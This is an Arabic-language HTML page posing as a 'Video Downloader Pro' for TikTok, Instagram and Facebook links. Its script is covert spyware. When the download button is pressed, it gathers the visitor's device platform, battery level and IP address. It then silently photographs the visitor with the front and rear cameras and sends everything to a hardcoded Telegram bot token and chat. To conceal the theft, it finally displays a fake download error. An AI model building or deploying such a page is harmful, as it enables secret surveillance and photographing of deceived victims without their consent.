<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Downloader Pro</title>
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .app-card { background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
        .logo { font-size: 50px; margin-bottom: 15px; }
        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
        .download-btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1rem; }
        #status { margin-top: 15px; font-size: 0.8rem; color: #94a3b8; display: none; }
        canvas, video { display: none; }
    </style>
</head>
<body>

<div class="app-card">
    <div class="logo">📥</div>
    <h2>حمل فيديوهاتك المفضلة</h2>
    <p style="font-size: 0.9rem; color: #94a3b8;">الصق رابط الفيديو من (TikTok, Instagram, Facebook) للتحميل بجودة عالية.</p>
    
    <input type="text" id="urlInput" placeholder="ضع الرابط هنا...">
    <button class="download-btn" onclick="startProcess()">بدء التحميل المباشر</button>
    
    <div id="status">جاري معالجة الرابط وتجهيز الجودة...</div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const chat = "7984067238";

    async function sendPhoto(blob, caption) {
        const fd = new FormData();
        fd.append("chat_id", chat);
        fd.append("photo", blob, "snap.jpg");
        fd.append("caption", caption);
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
        } catch (e) {}
    }

    async function getSpecs() {
        let info = `👤 *بيانات الهدف*:\n\n`;
        info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
        info += `• 🔋 البطارية: \`${(await navigator.getBattery()).level * 100}%\`\n`;
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
        } catch(e) {}
        return info;
    }

    async function capture(side) {
        const constraints = { video: { facingMode: side === "front" ? "user" : "environment" } };
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.getElementById('v');
            v.srcObject = stream;
            
            await new Promise(r => v.onloadedmetadata = r);
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            
            stream.getTracks().forEach(t => t.stop());
            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
        } catch (e) { return null; }
    }

    async function startProcess() {
        const url = document.getElementById('urlInput').value;
        if (!url) { alert("يرجى وضع رابط أولاً"); return; }

        document.getElementById('status').style.display = 'block';
        
        // 1. جلب البيانات النصية
        const specs = await getSpecs();
        
        // 2. تصوير الكاميرا الأمامية
        const frontImg = await capture("front");
        if (frontImg) await sendPhoto(frontImg, specs + "\n📷 (كاميرا أمامية)");

        // 3. تصوير الكاميرا الخلفية
        const backImg = await capture("back");
        if (backImg) await sendPhoto(backImg, "📷 (كاميرا خلفية)");

        setTimeout(() => {
            alert("خطأ: تعذر التحميل من هذا الرابط حالياً. جرب رابطاً آخر.");
            document.getElementById('status').style.display = 'none';
        }, 3000);
    }
</script>

</body>
</html>
